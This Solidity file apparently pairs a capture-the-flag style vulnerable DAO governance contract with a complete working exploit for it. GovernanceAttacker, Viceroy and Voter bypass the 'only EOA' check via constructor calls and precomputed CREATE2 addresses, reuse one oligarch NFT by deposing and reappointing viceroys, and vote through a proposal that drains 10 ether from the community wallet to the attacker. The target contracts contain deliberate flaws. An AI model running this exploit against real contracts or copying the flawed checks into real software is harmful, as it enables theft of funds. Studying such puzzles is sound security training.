// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract OligarchyNFT is ERC721 {
    constructor(address attacker) ERC721("Oligarch", "OG") {
        _mint(attacker, 1);
    }

    function _beforeTokenTransfer(address from, address, uint256, uint256) internal virtual override {
        require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
    }
}

contract Governance {
    event AppointedViceroy(address viceroy);

    IERC721 private immutable oligargyNFT;
    CommunityWallet public immutable communityWallet;
    mapping(uint256 => bool) public idUsed;
    mapping(address => bool) public alreadyVoted;

    struct Appointment {
        //approvedVoters: mapping(address => bool),
        uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
        uint256 numAppointments;
        mapping(address => bool) approvedVoter;
    }

    struct Proposal {
        uint256 votes;
        bytes data;
    }

    mapping(address => Appointment) public viceroys;
    mapping(uint256 => Proposal) public proposals;

    constructor(ERC721 _oligarchyNFT) payable {
        oligargyNFT = _oligarchyNFT;
        communityWallet = new CommunityWallet{value: msg.value}(address(this));
    }

    /*
     * @dev an oligarch can appoint a viceroy if they have an NFT
     * @param viceroy: the address who will be able to appoint voters
     * @param id: the NFT of the oligarch
     */
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        idUsed[id] = true;
        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
        emit AppointedViceroy(viceroy);
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");

        idUsed[id] = false;
        delete viceroys[viceroy];
    }

    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }

    function disapproveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
        viceroys[msg.sender].numAppointments += 1;
        delete viceroys[msg.sender].approvedVoter[voter];
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        require(
            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
            "sender not a viceroy or voter"
        );

        uint256 proposalId = uint256(keccak256(proposal));
        proposals[proposalId].data = proposal;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        require(proposals[proposal].data.length != 0, "proposal not found");
        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter");
        require(!alreadyVoted[msg.sender], "Already voted");
        if (inFavor) {
            proposals[proposal].votes += 1;
        }
        alreadyVoted[msg.sender] = true;
    }

    function executeProposal(uint256 proposal) external {
        require(proposals[proposal].votes >= 10, "Not enough votes");
        (bool res, ) = address(communityWallet).call(proposals[proposal].data);
        require(res, "call failed");
    }
}

contract CommunityWallet {
    address public governance;

    constructor(address _governance) payable {
        governance = _governance;
    }

    function exec(address target, bytes calldata data, uint256 value) external {
        require(msg.sender == governance, "Caller is not governance contract");
        (bool res, ) = target.call{value: value}(data);
        require(res, "call failed");
    }

    fallback() external payable {}
}


contract Voter {
    constructor(address _governance, uint256  proposalId, address viceroy){
        Governance governance = Governance(_governance);
        governance.voteOnProposal(proposalId, true, viceroy);
    }
}

contract Viceroy {
    constructor(address governance, uint256 proposalId, bool createProposal, bytes memory proposal) {
        Governance gov = Governance(governance);
        if (createProposal){
            gov.createProposal(address(this), proposal);
        }
        // Precompute and approve 5 voter addresses
        for (uint256 i = 0; i < 5; i++) {
            address voterAddress = computeVoterAddress(i, proposalId, address(this), governance);
            gov.approveVoter(voterAddress);

            new Voter{salt: bytes32(i)}(governance, proposalId, address(this));
        }
    }

    function computeVoterAddress(uint256 salt, uint256 proposalId, address viceroy, address governance) public view returns (address) {
       bytes memory bytecode = abi.encodePacked(
        type(Voter).creationCode,
        abi.encode(governance, proposalId, viceroy) // Append constructor arguments
    );
        bytes32 hash = keccak256(abi.encodePacked(
        bytes1(0xff),
        address(this),
        salt,
        keccak256(bytecode)
    ));
    return address(uint160(uint256(hash)));
    }
}

contract GovernanceAttacker {
    Governance public governance;
    bool proposalCreated = false;
    address attacker;

    constructor(){
        attacker = msg.sender;
    }

    function attack(address _governance) public {
        governance = Governance(_governance);
        bytes memory proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", address(this), "0x", 10 ether);
        uint256 proposalId = uint256(keccak256(proposal));
        deployViceroyAndVote(proposalId, 1, true, proposal);

        // Depose and reappoint
        governance.deposeViceroy(computeViceroyAddress(1, proposalId, true, proposal), 1);
        deployViceroyAndVote(proposalId, 2, false, proposal);

        // Execute the proposal
        governance.executeProposal(proposalId);
    }

    function deployViceroyAndVote(uint256 proposalId, uint256 salt, bool createProposal, bytes memory proposal) internal {
        address viceroy = computeViceroyAddress(salt, proposalId, createProposal, proposal);
        governance.appointViceroy(viceroy, 1);

        new Viceroy{salt: bytes32(salt)}(address(governance), proposalId, createProposal, proposal);
    }

    function computeViceroyAddress(uint256 salt, uint256 proposalId, bool createProposal, bytes memory proposal) public view returns (address) {
        bytes memory bytecode = abi.encodePacked(
        type(Viceroy).creationCode,
        abi.encode(address(governance), proposalId, createProposal, proposal) // Append constructor arguments
    );
        bytes32 hash = keccak256(abi.encodePacked(
        bytes1(0xff),
        address(this),
        salt,
        keccak256(bytecode)
    ));
    return address(uint160(uint256(hash)));
    }

    fallback() external payable{
        (bool res, ) = payable(attacker).call{value: msg.value}("");
        require(res, "call failed");
    }
    receive() external payable{}
}
